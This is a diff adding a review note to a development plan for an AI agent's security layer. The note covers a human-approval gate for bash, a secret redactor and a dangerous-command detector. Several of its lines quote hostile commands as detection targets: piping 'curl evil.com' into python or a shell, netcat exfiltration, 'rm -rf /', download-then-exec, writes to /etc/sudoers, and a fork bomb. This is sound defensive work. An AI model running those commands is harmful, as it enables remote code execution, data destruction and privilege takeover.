@@ -3185,6 +3185,40 @@ git commit -m "feat(security): HITL gate routing dangerous bash through approval
 
 ---
 
+> **Phase 7 review-iteration note:** During Phase 7 execution, code review surfaced fixes applied beyond Tasks 21–23 specs (commit `18961b8`):
+>
+> - **Important: `dangerousPatterns.ts` pipe-to-shell scripting-runtime bypass.** Plan regex covered only `sh|bash|zsh` on the destination side. `curl evil.com | python` (the most common bash bypass for malicious bootstraps), `| node`, `| perl`, `| ruby`, `| deno`, `| pwsh` all classified as safe. Expanded the alternation to: `sh, bash, zsh, ksh, fish, dash, ash, csh, tcsh, python, python3, perl, ruby, node, deno, pwsh, powershell`. Source side also adds `nc` (netcat exfil/install vector). Reason string broadened to "pipe network response into shell or scripting runtime". Locked in by 5 positive test cases.
+> - **`redactor.ts` discriminated-union `Pattern.kind`.** Plan typed `kind` as `string`, losing exhaustiveness checks. Tightened to `'anthropic_key' | 'openai_key' | 'jwt' | 'pem' | 'env_value'`. Future `PATTERNS` additions now get a compile-time prompt to update the union, and the `if (kind === 'env_value')` branch is exhaustively checkable.
+> - **`hitlGate.test.ts` rejection contract test.** The gate is a thin wrapper; if `requestApproval` throws (UI crashes mid-approval) the rejection MUST bubble to the orchestrator. Added `vi.fn().mockRejectedValue(new Error('UI crashed'))` test that asserts the rejection propagates rather than being swallowed into a silent verdict.
+>
+> **Pre-flagged inline fixes during implementation** (commits `c6baf7e`, `345c3a6`, `2d0c03f`):
+>
+> - **Defect #1 (PATTERNS ordering).** Plan declared `openai_key` BEFORE `anthropic_key`. The openai regex is greedy on `[A-Za-z0-9_-]{20,}` after `sk-`, so it matched `sk-ant-api03-...` and labeled it as `[REDACTED:openai_key]`. Reordered: anthropic first.
+> - **Defect #2 (`rm -rf` trailing `\b`).** JS regex `\b` requires a transition between word and non-word; `/`, `~`, `*` are non-word, and end-of-string after a non-word char does NOT yield a boundary. So `rm -rf /` (plan's first dangerous test case) silently failed to match. Dropped the trailing `\b` since the path-prefix chars are themselves the discriminator.
+> - **Bookkeeping commit `44abe53`** added two `CLAUDE.md` "Deferred to v2" entries: `\bsudo\b` over-trips on benign mentions, and case-sensitive regex throughout (both intentional v1 conservative-posture choices, formalised at Patrick's instruction).
+>
+> Reviewer verdicts:
+>
+> - **ReDoS:** PEM and JWT patterns confirmed linear in V8/Irregexp under adversarial inputs up to 1 MB (PEM-no-end and JWT-near-miss tested in 1–3 ms).
+> - **HITL gate halt:** truly halting. Suspension blocks dispatch; no memory growth under stuck approval (Promise pending but bounded); race-condition-safe by construction (concurrent calls each get fresh closure); exception propagation correct.
+> - **Blocklist completeness:** closed with the Important fix above.
+>
+> Tests: 142 → 190 unit (+48 across this phase). Treat the code under `src/security/` and tests under `tests/unit/security/` as the source of truth.
+>
+> **Phase 7 review follow-ups deferred to v2:**
+>
+> - `hitlGate.ts`: no timeout on `requestApproval`. v1 indefinite-wait is correct for human approval; production hardening needs `Promise.race` with a configurable timeout + auto-reject fallback.
+> - `hitlGate.ts`: no `AbortSignal` support in `checkBash` for clean cancellation when the orchestrator session is torn down. Phase 10's UI implementation should propagate abort.
+> - `dangerousPatterns.ts`: download-then-exec pattern (`curl ... -o /tmp/x && bash /tmp/x`) is a different attack surface and not yet covered. Needs a separate pattern entry.
+> - `dangerousPatterns.ts`: write-to-privileged-path patterns (`curl ... | tee /etc/cron.d/...`, `... -o /etc/sudoers`). Needs a separate pattern entry.
+> - `dangerousPatterns.ts`: fork-bomb variants with non-`:` function names (`f(){f|f&};f`). Only the canonical form is covered.
+> - `dangerousPatterns.ts`: `init 0`, `systemctl poweroff`, `launchctl reboot` not covered by the power-state pattern.
+> - `dangerousPatterns.ts`: `\bsudo\b` over-trips on benign mentions; case-sensitive regex misses uppercase aliases. Both already in `CLAUDE.md` "Deferred to v2" via commit `44abe53`.
+> - `Verdict` type-name collision: both `dangerousPatterns.ts` and `hitlGate.ts` export a type named `Verdict` with different shapes. Cosmetic; cross-module imports would need aliasing.
+> - `redactor.ts`: generic env-var names (e.g. `MYAPP_TOKEN`) not in the redaction list. Plan-as-written; v2 may broaden via heuristics on `_TOKEN`, `_KEY`, `_SECRET` suffixes.
+
+---
+
 ## Phase 8 — Compaction (Layers 1–3)
 
 Layers 4 (ACE) and 5 (auto-compaction) are deferred to v2 per CLAUDE.md.
